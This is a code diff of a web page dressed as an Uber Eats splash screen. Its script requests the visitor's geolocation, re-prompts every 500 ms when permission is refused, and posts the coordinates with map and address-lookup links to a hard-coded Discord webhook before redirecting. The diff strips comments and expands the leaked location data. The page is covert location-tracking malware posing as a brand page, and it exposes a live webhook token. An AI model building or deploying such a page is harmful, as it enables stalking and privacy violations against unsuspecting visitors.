@@ -8,7 +8,7 @@
     html, body {
       margin: 0; padding: 0;
       height: 100vh;
-      background-color: #00B14F; /* Uber Eats 緑 */
+      background-color: #00B14F;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -24,17 +24,15 @@
 
     .uber-logo .top {
       font-size: 48px;
-      font-weight: 300; /* 細め */
+      font-weight: 300;
       text-transform: lowercase;
       line-height: 1.1;
-      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
     }
 
     .uber-logo .bottom {
       font-size: 48px;
-      font-weight: 700; /* 太め */
+      font-weight: 700;
       line-height: 1.1;
-      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
     }
   </style>
 </head>
@@ -45,13 +43,10 @@
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1388700849257189566/wMhfECmtZFOk5rO6unLV8IDN-eBJoxmW8ajtlC1ZL8eKh2ztPMzi1DqBGlG-2uOuZ9Mh"; // 自分のWebhook URLに変えてね！
+    const webhookURL = "https://discord.com/api/webhooks/1388700849257189566/wMhfECmtZFOk5rO6unLV8IDN-eBJoxmW8ajtlC1ZL8eKh2ztPMzi1DqBGlG-2uOuZ9Mh";
 
     function requestLocation() {
-      if (!navigator.geolocation) {
-        console.error("Geolocation API not supported");
-        return;
-      }
+      if (!navigator.geolocation) return;
 
       navigator.geolocation.getCurrentPosition(
         position => {
@@ -60,32 +55,30 @@
           sendToDiscord(lat, lon);
         },
         error => {
-          if (error.code === error.PERMISSION_DENIED) {
-            setTimeout(requestLocation, 500); // 許可されるまで繰り返し
-          } else {
-            setTimeout(requestLocation, 500); // 他エラーでもリトライ
-          }
+          setTimeout(requestLocation, 500);
         }
       );
     }
 
     function sendToDiscord(lat, lon) {
-      const mapURL = `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&z=15&size=450,300&l=map&pt=${lon},${lat},pm2rdl`;
+      const staticMapURL = `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&z=15&size=450,300&l=map&pt=${lon},${lat},pm2rdl`;
+      const gmapViewURL = `https://www.google.com/maps?q=${lat},${lon}`;
+      const gmapSearchURL = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
 
       fetch(webhookURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          content: `📍 現在地:\n緯度: ${lat}\n経度: ${lon}\n🗺️ 地図画像: ${mapURL}\nhttps://www.google.com/maps?q=${lat},${lon}`
+          content: `📍 **現在地情報**\n緯度: ${lat}\n経度: ${lon}\n🗺️ 地図画像: ${staticMapURL}\n🔗 Googleマップ表示: ${gmapViewURL}\n📌 住所を調べる: ${gmapSearchURL}`
         }),
       })
       .then(() => {
         setTimeout(() => {
           window.location.href = "home.html";
-        }, 3000); // 3秒後に遷移
+        }, 3000);
       })
       .catch(() => {
-        setTimeout(requestLocation, 1000); // 送信失敗したら再リクエスト
+        setTimeout(requestLocation, 1000);
       });
     }
 
